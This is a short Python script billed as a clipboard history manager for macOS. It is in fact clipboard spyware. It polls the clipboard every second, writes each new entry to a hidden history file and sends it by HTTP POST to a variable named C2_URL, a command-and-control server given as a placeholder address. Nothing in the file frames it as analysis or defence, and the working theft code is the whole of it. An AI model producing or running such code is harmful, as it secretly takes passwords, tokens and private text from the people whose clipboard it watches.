import pyperclip
import time
import os
import requests

# Path to the clipboard history file
history_file = os.path.expanduser("~/.local/share/.clipboard_history.txt")

# URL of the C2 server
C2_URL = "http://x.x.x.x:port/clipboard"

def read_clipboard():
    try:
        return pyperclip.paste()
    except Exception as e:
        print(f"Error reading clipboard: {e}")
        return None

def write_history(content):
    with open(history_file, 'a') as file:
        file.write(content + "\n")

def send_to_c2(content):
    try:
        response = requests.post(C2_URL, json={"clipboard": content})
        if response.status_code == 200:
            print("Clipboard data sent to C2 server.")
        else:
            print(f"Failed to send data to C2 server: {response.status_code}")
    except Exception as e:
        print(f"Error sending data to C2 server: {e}")

def track_clipboard():
    last_content = ""
    while True:
        current_content = read_clipboard()
        if current_content and current_content != last_content:
            print(f"New clipboard content detected: {current_content}")
            write_history(current_content)
            send_to_c2(current_content)
            last_content = current_content
        time.sleep(1)

def show_history():
    if os.path.exists(history_file):
        with open(history_file, 'r') as file:
            history = file.readlines()
            print("Clipboard History:")
            for idx, item in enumerate(history, 1):
                print(f"{idx}: {item.strip()}")
    else:
        print("No clipboard history found.")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Clipboard history manager for macOS.")
    parser.add_argument("-t", "--track", action="store_true", help="Track clipboard changes and save to history.")
    parser.add_argument("-s", "--show", action="store_true", help="Show clipboard history.")

    args = parser.parse_args()

    if args.track:
        track_clipboard()
    elif args.show:
        show_history()
    else:
        parser.print_help()
